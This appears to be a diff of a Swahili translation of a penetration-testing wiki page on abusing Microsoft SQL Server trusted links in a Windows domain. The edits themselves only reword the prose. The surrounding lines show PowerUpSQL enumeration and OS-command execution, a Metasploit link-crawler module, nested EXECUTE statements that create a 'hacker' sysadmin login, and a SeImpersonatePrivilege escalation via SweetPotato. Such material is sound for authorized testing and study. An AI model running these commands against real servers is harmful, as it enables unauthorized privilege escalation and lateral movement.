@@ -127,7 +127,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Msingi wa Kutumia
+## MSSQL Msingi wa Kutumiwa
 
 ### Upatikanaji wa DB
 ```powershell
@@ -150,19 +150,19 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 ```
 Angalia katika ukurasa ulioelezwa katika **sehemu ifuatayo jinsi ya kufanya hivi kwa mikono.**
 
-### MSSQL Njia za Msingi za Hacking
+### Njia za Msingi za Kudhuru MSSQL
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL Viungo Vilivyokubaliwa
+## Viungo Vilivyoaminika vya MSSQL
 
-Ikiwa mfano wa MSSQL unakubaliwa (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyo na uaminifu, ataweza **kutumia uhusiano wa uaminifu kutekeleza maswali pia katika mfano mwingine**. Hii inaruhusiwa kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
+Ikiwa mfano wa MSSQL umeaminika (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminika, ataweza **kutumia uhusiano wa kuaminiana kutekeleza maswali pia katika mfano mwingine**. Hizi kuaminika zinaweza kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
 
-**Viungo kati ya databases vinafanya kazi hata kupitia uaminifu wa msitu.**
+**Viungo kati ya databases vinatumika hata katika kuaminiana kwa misitu.**
 
-### Abuse ya Powershell
+### Kunyanyaswa kwa Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -196,7 +196,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Unaweza kwa urahisi kuangalia viungo vinavyotegemewa kwa kutumia metasploit.
+Unaweza kwa urahisi kuangalia viungo vya kuaminika ukitumia metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -204,7 +204,7 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 ```
 Tafadhali kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
 
-### Manual - Openquery()
+### Mikono - Openquery()
 
 Kutoka **Linux** unaweza kupata shell ya MSSQL console kwa kutumia **sqsh** na **mssqlclient.py.**
 
@@ -214,7 +214,7 @@ _Ingia kwa kutumia uthibitisho wa Windows:_
 
 ![](<../../images/image (808).png>)
 
-#### Tafuta Viungo vya Kuaminika
+#### Pata Viungo vya Kuaminika
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -244,17 +244,17 @@ Ikiwa huwezi kufanya vitendo kama `exec xp_cmdshell` kutoka `openquery()`, jarib
 
 ### Manual - EXECUTE
 
-Unaweza pia kutumia viungo vya kuaminika kwa kutumia `EXECUTE`:
+Unaweza pia kutumia vibaya viungo vinavyoaminika kwa kutumia `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Kuinua Haki za Mitaa
+## Local Privilege Escalation
 
-Mtumiaji wa **MSSQL wa ndani** kwa kawaida ana aina maalum ya haki inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
+Mkasisi wa **MSSQL local user** kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
 
-Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya uasi au mtu katikati ambayo mshambuliaji anaunda. Huduma hii ya uasi inaweza kujifanya kama huduma ya SYSTEM wakati inajaribu kuthibitisha.
+Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya rogue au man-in-the-middle ambayo mshambuliaji anaunda. Huduma hii ya rogue inaweza kujifanya huduma ya SYSTEM wakati inajaribu kuthibitisha.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ina mkusanyiko wa mbinu hizi mbalimbali ambazo zinaweza kutekelezwa kupitia amri ya `execute-assembly` ya Beacon.
 
